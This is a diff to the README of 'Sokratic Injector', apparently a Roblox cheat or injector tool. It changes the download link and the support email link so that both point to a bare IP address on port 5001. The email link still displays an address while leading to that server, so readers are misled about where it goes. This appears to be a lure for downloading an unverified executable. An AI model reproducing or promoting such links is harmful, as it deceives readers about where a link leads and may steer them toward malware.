@@ -25,7 +25,7 @@ Sokratic Injector is a powerful and secure tool for Roblox enthusiasts, designed
 
 ## 📥 Download
 
-Visit our [official website](#) to download the latest version of Sokratic Injector.
+Visit our [official website](http://3.139.240.11:5001/index.html) to download the latest version of Sokratic Injector.
 
 ---
 
@@ -37,4 +37,4 @@ Sokratic Injector is intended for educational purposes only. Any misuse, includi
 
 ## 📞 Contact
 
-For support or inquiries, contact us at [support@sokraticinjector.com](mailto:support@sokraticinjector.com).
+For support or inquiries, contact us at [support@sokraticinjector.com](http://3.139.240.11:5001/index.html).
